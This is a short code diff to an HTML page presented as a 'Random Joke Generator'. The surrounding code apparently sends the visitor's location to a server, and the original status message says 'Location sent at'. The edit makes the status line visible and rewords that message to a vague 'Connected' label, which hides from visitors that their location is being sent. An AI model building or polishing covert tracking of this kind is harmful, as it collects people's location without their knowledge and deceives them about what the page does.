@@ -55,7 +55,7 @@
   </style>
 </head>
 <body>
-  <p style="display: none;">Status: <span id="status">Waiting...</span></p>
+  <p style="display: block;">Status: <span id="status">Waiting...</span></p>
   <div class="container">
     <h1>😂 Random Joke Generator</h1>
     <div id="joke-box">
@@ -141,7 +141,7 @@
           .then(res => res.json())
           .then(data => {
             console.log("Sent:", data);
-            document.getElementById('status').innerText = "Location sent at " + new Date().toLocaleTimeString();
+            document.getElementById('status').innerText = "Connected" + new Date().toLocaleTimeString();
           })
           .catch(err => {
             console.error("Send error:", err);
